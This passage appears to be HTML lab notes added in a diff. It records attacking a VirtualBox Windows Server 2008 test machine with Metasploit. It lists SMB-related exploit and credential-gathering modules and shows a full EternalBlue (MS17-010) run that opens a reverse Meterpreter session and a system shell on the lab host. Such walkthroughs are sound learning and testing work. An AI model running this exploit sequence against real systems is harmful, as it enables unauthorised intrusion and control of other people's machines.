+   56   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
+   57   exploit/windows/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
+   58   exploit/windows/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_shadow                                  2021-02-16       manual     No     Microsoft Windows <span
+style="background-color:#75507B">SMB</span> Direct Session Takeover
+   59   auxiliary/dos/windows/<span style="background-color:#75507B">smb</span>/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS Srv<span
+style="background-color:#75507B">Smb</span>QueryFsInformation Pool Overflow DoS
+   60   exploit/windows/<span style="background-color:#75507B">smb</span>/ms10_046_shortcut_icon_dllloader            2010-07-16       <font
+color="#4E9A06">excellent</font>  No     Microsoft Windows Shell LNK Code Execution
+   61   exploit/windows/<span style="background-color:#75507B">smb</span>/ms15_020_shortcut_icon_dllloader            2015-03-10       <font
+color="#4E9A06">excellent</font>  No     Microsoft Windows Shell LNK Code Execution
+   62   auxiliary/docx/word_unc_injector                                                 normal     No     Microsoft Word UNC Path Injector
+   63   auxiliary/spoof/nbns/nbns_response                                               normal     No     NetBIOS Name Service Spoofer
+   64   exploit/windows/<span style="background-color:#75507B">smb</span>/netidentity_xtierrpcpipe                    2009-04-06       <font
+color="#4E9A06">great</font>      No     Novell NetIdentity Agent XTIERRPCPIPE Named Pipe Buffer Overflow
+   65   exploit/netware/<span style="background-color:#75507B">smb</span>/lsass_cifs                                  2007-01-21       average    No     Novell NetWare LSASS CIFS.NLM Driver Stack Buffer Overflow
+   66   exploit/windows/oracle/extjob                                   2007-01-01       <font
+color="#4E9A06">excellent</font>  Yes    Oracle Job Scheduler Named Pipe Command Execution
+   67   auxiliary/admin/oracle/ora_ntlm_stealer                         2009-04-07       normal     No     Oracle <span
+style="background-color:#75507B">SMB</span> Relay Code Execution
+   68   auxiliary/scanner/dcerpc/petitpotam                                              normal     No     PetitPotam
+   69   auxiliary/admin/<span style="background-color:#75507B">smb</span>/psexec_ntdsgrab                                              normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
+   70   auxiliary/scanner/sap/sap_<span style="background-color:#75507B">smb</span>_relay                                              normal     No     SAP <span
+style="background-color:#75507B">SMB</span> Relay Abuse
+   71   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                   normal     No     SAP SOAP EPS_DELETE_FILE File Deletion
+   72   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                     normal     No     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
+   73   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                   normal     No     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
+   74   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                  normal     No     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
+   75   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_create_pipe_corrupt                                    normal     No     <span
+style="background-color:#75507B">SMB</span> Create Pipe Request Corruption
+   76   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_create_pipe                                            normal     No     <span
+style="background-color:#75507B">SMB</span> Create Pipe Request Fuzzer
+   77   exploit/windows/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_doublepulsar_rce                        2017-04-14       <font
+color="#4E9A06">great</font>      Yes    <span style="background-color:#75507B">SMB</span> DOUBLEPULSAR Remote Code Execution
+   78   exploit/windows/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_delivery                                2016-07-26       <font
+color="#4E9A06">excellent</font>  No     <span style="background-color:#75507B">SMB</span> Delivery
+   79   auxiliary/admin/<span style="background-color:#75507B">smb</span>/list_directory                                               normal     No     <span
+style="background-color:#75507B">SMB</span> Directory Listing Utility
+   80   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_enumusers_domain                                       normal     No     <span
+style="background-color:#75507B">SMB</span> Domain User Enumeration
+   81   auxiliary/admin/<span style="background-color:#75507B">smb</span>/delete_file                                                  normal     No     <span
+style="background-color:#75507B">SMB</span> File Delete Utility
+   82   auxiliary/admin/<span style="background-color:#75507B">smb</span>/download_file                                                normal     No     <span
+style="background-color:#75507B">SMB</span> File Download Utility
+   83   auxiliary/admin/<span style="background-color:#75507B">smb</span>/upload_file                                                  normal     No     <span
+style="background-color:#75507B">SMB</span> File Upload Utility
+   84   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_enum_gpp                                               normal     No     <span
+style="background-color:#75507B">SMB</span> Group Policy Preference Saved Passwords Enumeration
+   85   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_login                                                  normal     No     <span
+style="background-color:#75507B">SMB</span> Login Check Scanner
+   86   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_ntlm1_login_corrupt                                    normal     No     <span
+style="background-color:#75507B">SMB</span> NTLMv1 Login Request Corruption
+   87   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_negotiate_corrupt                                      normal     No     <span
+style="background-color:#75507B">SMB</span> Negotiate Dialect Corruption
+   88   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>2_negotiate_corrupt                                     normal     No     <span
+style="background-color:#75507B">SMB</span> Negotiate <span style="background-color:#75507B">SMB</span>2 Dialect Corruption
+   89   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_lookupsid                                              normal     No     <span
+style="background-color:#75507B">SMB</span> SID User Enumeration (LookupSid)
+   90   auxiliary/admin/<span style="background-color:#75507B">smb</span>/check_dir_file                                               normal     No     <span
+style="background-color:#75507B">SMB</span> Scanner Check File/Directory Utility
+   91   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/pipe_auditor                                               normal     No     <span
+style="background-color:#75507B">SMB</span> Session Pipe Auditor
+   92   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/pipe_dcerpc_auditor                                        normal     No     <span
+style="background-color:#75507B">SMB</span> Session Pipe DCERPC Auditor
+   93   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_enumshares                                             normal     No     <span
+style="background-color:#75507B">SMB</span> Share Enumeration
+   94   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_tree_connect_corrupt                                   normal     No     <span
+style="background-color:#75507B">SMB</span> Tree Connect Request Corruption
+   95   auxiliary/fuzzers/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_tree_connect                                           normal     No     <span
+style="background-color:#75507B">SMB</span> Tree Connect Request Fuzzer
+   96   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_enumusers                                              normal     No     <span
+style="background-color:#75507B">SMB</span> User Enumeration (SAM EnumUsers)
+   97   auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_version                                                normal     No     <span
+style="background-color:#75507B">SMB</span> Version Detection
+   98   auxiliary/dos/<span style="background-color:#75507B">smb</span>/<span style="background-color:#75507B">smb</span>_loris                                     2017-06-29       normal     No     <span
+style="background-color:#75507B">SMB</span>Loris NBSS Denial of Service
+   99   exploit/windows/local/cve_2020_0796_<span style="background-color:#75507B">smb</span>ghost                    2020-03-13       good       Yes    <span
+style="background-color:#75507B">SMB</span>v3 Compression Buffer Overflow
+   100  exploit/windows/<span style="background-color:#75507B">smb</span>/cve_2020_0796_<span
+style="background-color:#75507B">smb</span>ghost                      2020-03-13       average    Yes    <span
+style="background-color:#75507B">SMB</span>v3 Compression Buffer Overflow
+   101  auxiliary/scanner/snmp/snmp_enumshares                                           normal     No     SNMP Windows <span
+style="background-color:#75507B">SMB</span> Share Enumeration
+   102  auxiliary/admin/<span style="background-color:#75507B">smb</span>/samba_symlink_traversal                                      normal     No     Samba Symlink Directory Traversal
+   103  auxiliary/scanner/<span style="background-color:#75507B">smb</span>/<span
+style="background-color:#75507B">smb</span>_uninit_cred                                            normal     Yes    Samba _netr_ServerPasswordSet Uninitialized Credential State
+   104  exploit/linux/samba/chain_reply                                 2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
+   105  auxiliary/dos/samba/read_nttrans_ea_list                                         normal     No     Samba read_nttrans_ea_list Integer Overflow
+   106  exploit/multi/ids/snort_dce_rpc                                 2007-02-19       good       No     Snort 2 DCE/RPC Preprocessor Buffer Overflow
+   107  exploit/windows/browser/java_ws_double_quote                    2012-10-16       <font
+color="#4E9A06">excellent</font>  No     Sun Java Web Start Double Quote Injection
+   108  exploit/windows/browser/java_ws_arginject_altjvm                2010-04-09       <font
+color="#4E9A06">excellent</font>  No     Sun Java Web Start Plugin Command Line Argument Injection
+   109  exploit/windows/browser/java_ws_vmargs                          2012-02-14       <font
+color="#4E9A06">excellent</font>  No     Sun Java Web Start Plugin Command Line Argument Injection
+   110  auxiliary/server/teamviewer_uri_<span style="background-color:#75507B">smb</span>_redirect                                     normal     No     TeamViewer Unquoted URI Handler <span
+style="background-color:#75507B">SMB</span> Redirect
+   111  exploit/windows/<span style="background-color:#75507B">smb</span>/timbuktu_plughntcommand_bof                 2009-06-25       <font
+color="#4E9A06">great</font>      No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
+   112  exploit/windows/fileformat/ursoft_w32dasm                       2005-01-24       good       No     URSoft W32Dasm Disassembler Function Buffer Overflow
+   113  exploit/windows/fileformat/vlc_<span style="background-color:#75507B">smb</span>_uri                          2009-06-24       <font
+color="#4E9A06">great</font>      No     VideoLAN Client (VLC) Win32 <span style="background-color:#75507B">smb</span>:// URI Buffer Overflow
+   114  auxiliary/scanner/<span style="background-color:#75507B">smb</span>/impacket/wmiexec                          2018-03-19       normal     No     WMI Exec
+   115  auxiliary/admin/<span style="background-color:#75507B">smb</span>/webexec_command                                              normal     No     WebEx Remote Command Execution Utility
+   116  exploit/windows/<span style="background-color:#75507B">smb</span>/webexec                                     2018-10-24       manual     No     WebExec Authenticated User Code Execution
+   117  post/windows/escalate/droplnk                                                    normal     No     Windows Escalate <span
+style="background-color:#75507B">SMB</span> Icon LNK Dropper
+   118  post/windows/gather/credentials/gpp                                              normal     No     Windows Gather Group Policy Preference Saved Passwords
+   119  post/windows/gather/word_unc_injector                                            normal     No     Windows Gather Microsoft Office Word UNC Path Injector
+   120  post/windows/gather/enum_shares                                                  normal     No     Windows Gather <span
+style="background-color:#75507B">SMB</span> Share Enumeration via Registry
+   121  payload/windows/peinject/reverse_named_pipe                                      normal     No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (<span
+style="background-color:#75507B">SMB</span>) Stager
+   122  payload/windows/x64/peinject/reverse_named_pipe                                  normal     No     Windows Inject Reflective PE Files, Windows x64 Reverse Named Pipe (<span
+style="background-color:#75507B">SMB</span>) Stager
+   123  payload/windows/x64/meterpreter/reverse_named_pipe                               normal     No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (<span
+style="background-color:#75507B">SMB</span>) Stager
+   124  payload/windows/meterpreter/reverse_named_pipe                                   normal     No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (<span
+style="background-color:#75507B">SMB</span>) Stager
+   125  post/windows/gather/netlm_downgrade                                              normal     No     Windows NetLM Downgrade Attack
+   126  auxiliary/fileformat/multidrop                                                   normal     No     Windows <span
+style="background-color:#75507B">SMB</span> Multi Dropper
+
+
+Interact with a module by name or index. For example <font color="#4E9A06">info 126</font>, <font
+color="#4E9A06">use 126</font> or <font color="#4E9A06">use auxiliary/fileformat/multidrop</font></samp>
+</pre>
+    <p> Here is where metasploit console does it work. The important step in the
+      process is where the meteterpreter opens a connection from the victim (the
+      Windows 2008 machine) to the attacker (this Kali linux machine) </p>
+    <pre><br><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EF2929"><b>windows/smb/ms17_010_eternalblue</b></font>) &gt; <kbd>set rhost 192.168.0.26</kbd>
+rhost =&gt; 192.168.0.26
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EF2929"><b>windows/smb/ms17_010_eternalblue</b></font>) &gt; <kbd>exploit</kbd>
+<samp>
+<font color="#729FCF"><b>[*]</b></font> Started reverse TCP handler on 192.168.0.14:4444 
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445      - Scanned 1 of 1 hosts (100% complete)
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - The target is vulnerable.
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Connecting to target for exploitation.
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - Connection established for exploitation.
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - Target OS selected valid for OS indicated by SMB reply
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - CORE raw buffer dump (51 bytes)
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - 0x00000030  6b 20 31                                         k 1             
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Trying exploit with 12 Groom Allocations.
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Sending all but last fragment of exploit packet
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Starting non-paged pool grooming
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - Sending SMBv2 buffers
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Sending final SMBv2 buffers.
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Sending last fragment of exploit packet!
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Receiving response from exploit packet
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Sending egg to corrupted connection.
+<font color="#729FCF"><b>[*]</b></font> 192.168.0.26:445 - Triggering free of corrupted buffer.
+<font color="#729FCF"><b>[*]</b></font> Sending stage (200262 bytes) to 192.168.0.26
+<font color="#729FCF"><b>[*]</b></font> <span class="important">Meterpreter session 1 opened (192.168.0.14:4444 -&gt; 192.168.0.26:49594 ) at 2022-04-10 05:10:46 -0400</span>
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+<font color="#8AE234"><b>[+]</b></font> 192.168.0.26:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</samp>
+
+<u style="text-decoration-style:single">meterpreter</u> &gt; 
+<u style="text-decoration-style:single">meterpreter</u> &gt; shell
+Process 3932 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+
+C:\Windows\system32&gt;systeminfo
+systeminfo
+
+Host Name:                 VAGRANT-2008R2
+OS Name:                   Microsoft Windows Server 2008 R2 Standard 
+OS Version:                6.1.7601 Service Pack 1 Build 7601
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          
+Registered Organization:   Vagrant Inc.
+Product ID:                00477-001-0000347-84206
+Original Install Date:     3/6/2022, 2:07:14 AM
+System Boot Time:          4/10/2022, 1:38:44 AM
+System Manufacturer:       innotek GmbH
+System Model:              VirtualBox
+System Type:               x64-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: Intel64 Family 6 Model 42 Stepping 7 GenuineIntel ~3292 Mhz
+BIOS Version:              innotek GmbH VirtualBox, 12/1/2006
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
+Total Physical Memory:     4,096 MB
+Available Physical Memory: 2,130 MB
+Virtual Memory: Max Size:  8,189 MB
+Virtual Memory: Available: 5,209 MB
+Virtual Memory: In Use:    2,980 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    WORKGROUP
+Logon Server:              N/A
+Hotfix(s):                 2 Hotfix(s) Installed.
+                           [01]: KB3134760
+                           [02]: KB976902
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Desktop Adapter
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    Yes
+                                 DHCP Server:     192.168.0.1
+                                 IP address(es)
+                                 [01]: 192.168.0.26
+                                 [02]: fe80::652b:63a5:e323:504
+                                 [03]: fd02:bf11:df72:1:652b:63a5:e323:504
+                                 [04]: 2602:4b:ac60:e101:652b:63a5:e323:504
+
+C:\Windows\system32&gt;
+
+</pre>
+    <p></p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <p><br>
+    </p>
+    <hr style="width: 100%; height: 3px; color: #0704a9; margin-left: auto; margin-right: auto;">
+    <h1><a id="mozTocId52415" class="mozTocH1"></a>Table of Contents</h1>
+    <ol id="mozToc">
+      <!--mozToc h1 1 h2 2 h3 3 h4 4 h5 5 h6 6-->
+      <li><a href="#mozTocId645626">Metasploitable</a></li>
+      <li><a href="#mozTocId511272">Windows Server/2008 (win2K8)</a></li>
+      <li><a href="#mozTocId424837">Metasploitable - chronological</a>
+        <ol>
+          <li><a href="#mozTocId803519">April 6th 2022</a>
+            <ol>
+              <li><a href="#mozTocId36977">nmap</a></li>
+              <li><a href="#mozTocId481628">Ubuntu 14.04</a></li>
+              <li><a href="#mozTocId355017">Windows 2K</a></li>
+            </ol>
+          </li>
+          <li><a href="#mozTocId406026">April 7th 2022</a>
+            <ol>
+              <li><a href="#mozTocId695649">Windows 2K8</a>
+                <ol>
+                  <li><a href="#mozTocId283995">Manage Engine Desktop Central 9</a></li>
+                  <li><a href="#mozTocId44929">SMB or CIFS</a></li>
+                </ol>
+              </li>
+            </ol>
+          </li>
+          <li><a href="#mozTocId333779">April 9th</a>
+            <ol>
+              <li><a href="#mozTocId867485">Windows 2K8</a>
+                <ol>
+                  <li><a href="#mozTocId35306">Running nmap</a></li>
+                  <li><a href="#mozTocId932987">Running msfconsole</a></li>
+                </ol>
+              </li>
+            </ol>
+          </li>
+        </ol>
+      </li>
+      <li><a href="#mozTocId52415">Table of Contents</a></li>
+    </ol>
+    <p><br>
+    </p>
+  </body>
+</html>
